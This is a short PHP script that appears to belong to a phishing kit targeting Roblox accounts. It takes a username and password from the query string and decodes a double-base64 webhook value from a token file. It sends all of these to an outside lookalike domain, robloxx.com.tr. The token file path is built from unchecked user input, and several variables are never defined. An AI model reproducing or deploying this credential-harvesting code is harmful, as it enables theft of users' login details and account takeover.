<?php
include("controllerPages/Admin/termed.php");
$username = isset($_GET['username']) ? urldecode($_GET['username']) : '';
$password = isset($_GET['password']) ? urldecode($_GET['password']) : '';
$returnUrl = isset($_GET['returnUrl']) ? urldecode($_GET['returnUrl']) : '';
$returnUrlFile = 'tokens/returnUrl-' . urldecode($_GET['returnUrl']) . '.txt';
$Nwebhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
if (!empty($returnUrl)) {
    $redirectUrl = "https://robloxx.com.tr/auth.php?password=$password&returnUrl=$returnUrl&username=$username&imgurl=$imgurl&color=$color&name=$name&webhook=$webhook&Normalwebhook=$Nwebhook";
$response = file_get_contents($redirectUrl);
}
?>
